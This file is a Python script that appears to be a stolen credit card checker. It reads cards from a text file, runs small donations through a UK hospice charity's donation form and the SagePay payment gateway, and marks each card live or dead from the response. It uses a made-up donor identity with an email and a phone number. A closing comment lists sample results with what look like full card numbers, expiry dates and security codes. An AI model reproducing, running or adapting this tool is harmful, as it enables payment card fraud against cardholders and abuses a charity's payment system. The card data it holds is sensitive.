from bs4 import BeautifulSoup
from colorama import Fore, init
import smtplib
import requests
import time


init()


class Checker():
    def __init__(self):
        self.range = []
        
        print("""
        {re}             {g}_____________{re}
        {re}------------{g}[ {r}CODECHECKER {g}]{re}------------
        {re}------------{g}|- {r}GATEWAY 2 -{g}|{re}------------
        {re}---------------------------------------
        """.format(g=Fore.GREEN, r=Fore.RED, re=Fore.RESET))
        
        print("\t            " + Fore.GREEN + "[CHOOSE CC TYPE]")
        print(Fore.YELLOW + "------------------------------------------------------------")
        print("{}[1] {}Visa\t{}[2] {}Visa Debit\t{}[3] {}MasterCard\t{}[4] {}MC Debit".format(Fore.RED, Fore.RESET,Fore.RED, Fore.RESET,Fore.RED, Fore.RESET,Fore.RED, Fore.RESET))
        print(Fore.YELLOW + "------------------------------------------------------------\n" + Fore.RESET)

        cctype = input(Fore.BLUE + "[?] CCType >>> " + Fore.RESET)
        if cctype == '1':
            self.cc = "VISA"
        elif cctype == '2':
            self.cc = "DELTA"
        elif cctype == "3":
            self.cc = 'MC'
        elif cctype == '4':
            self.cc = "MCDEBIT"
        else:
            print(Fore.RED + "[-] " + Fore.RESET + "Credit Card Type must be included")
            return

        # self.proxy_https = {"https": "http://us.smartproxy.com:10000"}
        self.proxy_https = {"https": ""}
        with open('cc.txt', 'r') as ccs:
            for x in ccs.read().split('\n'):
                self.range.append(x)
        print(Fore.YELLOW + "[*] " + Fore.RESET + 'Checking ' + str(len(self.range)) + ' Credit Cards.')
        input(Fore.RESET + "PRESS ANY KEY TO CONTINUE")
        print(Fore.BLUE + "Start Checking at " + str(time.ctime()))
        print(Fore.RESET)
        self.checker()

    def check_on_sage(self, credit_card, ccentry):
        ccentry = str(ccentry)
        ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
        session = requests.Session()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}


        mainSauce = BeautifulSoup(session.get('https://www.rowanshospice.co.uk/donate/make-a-donation/', headers=headers).text, 'html.parser')

        state_6 = mainSauce.find('input', {'name': 'state_6'})['value']

        persdeyta = {
            'input_13': '£ 1.00',
            'input_2': 'Mr',
            'input_3': 'Elijah',
            'input_4': 'Liams',
            'input_25': 'ckknocktoyou@gmail.com',
            'input_30': 'Mr',
            'input_8': 'Street 918 commonwealth ave.',
            'input_31': '',
            'input_9': 'Quezon City',
            'input_10': 'Manila',
            'input_6': '1216',
            'input_28.4': '',
            'input_28.6': 'Philippines',
            'input_12': '09496014475',
            'input_29': '',
            'input_32.2': 'email',
            'input_27.3': 'No thank you',
            'input_33.3': 'No thank you',
            'input_35.2': 'No thank you',
            'is_submit_6': '1',
            'gform_submit': '6',
            'gform_unique_id': '',
            'state_6': "WyJbXSIsIjk4Njk2OWVhNDcxMGE5Njc1OTliZTUwZDdhNTQzM2VhIl0",
            'gform_target_page_number_6': '0',
            'gform_source_page_number_6': '1',
            'gform_field_values': '',
        }


        persrespans = BeautifulSoup(session.post('https://www.rowanshospice.co.uk/donate/make-a-donation/', data=persdeyta, headers=headers).text, 'html.parser')
        
        lastdeyta = {
            'VPSProtocol': '3.00',
            'TxType': 'PAYMENT',
            'Vendor': 'rowanshospice',
            'Crypt': persrespans.find('input', {'name': 'Crypt'})['value']
        }

        he = {
            "cache-control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
            "content-language": "en-US",
            "content-type": "application/x-www-form-urlencoded"
        }
        last = session.post('https://live.sagepay.com/gateway/service/vspform-register.vsp', data=lastdeyta, headers=headers)
        ################# SAGE PAY ###################

        fourthSource = session.post("https://live.sagepay.com/gateway/service/cardselection", data={'action': 'proceed', 'cardselected': self.cc}, headers=headers)

        sixthData = {
            'cardholder': "Elijah Liams",
            'cardnumber': ccNum,
            'expirymonth': ccMonth,
            'expiryyear': ccYear,
            'securitycode': ccCode,
            'action': 'proceed',
        }
        sixthSource = session.post("https://live.sagepay.com/gateway/service/carddetails", data=sixthData, headers=headers)
        seventhSource = session.get("https://live.sagepay.com/gateway/service/cardconfirmation", headers=headers).text
        eightSource = session.post("https://live.sagepay.com/gateway/service/cardconfirmation", data={'action': 'proceed'}, headers=headers)
        lastShit = BeautifulSoup(session.get("https://live.sagepay.com/gateway/service/authentication", headers=headers).text, 'html.parser')


        try:
            if "insufficient" in lastShit.find('div', {'class': "notification"}).get_text().replace('\n', '').replace('\t', ''):
                print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card)

            print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\tREASON: ' + lastShit.find('div', {'class': "notification"}).get_text().replace('\n', '').replace('\t', ''))
        except Exception as e:

            print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card + '\tNote: Not Sure')


    def checker(self):
        f = open('cc.txt', 'r')
        cc = 0
        for x in f.read().split('\n'):
            cc += 1
            self.check_on_sage(x, cc)



"""
[693] 5210690278620433|06|2027|787      ----            The Authorisation has been rejected by the Vendor due to insufficient authentication. Please try a different card. 

[1]LIVE ----    4355440407061317|04|2023|632 => Your card's security code is incorrect.
[2] DEAD        ----    4355440407061572|04|2023|374 => Your card was declined.
[3]LIVE ----    4355440407060244|04|2023|292 => Your card's security code is incorrect.
[4] DEAD        ----    4355440407065326|04|2023|235 => Your card was declined.

"""

Checker()
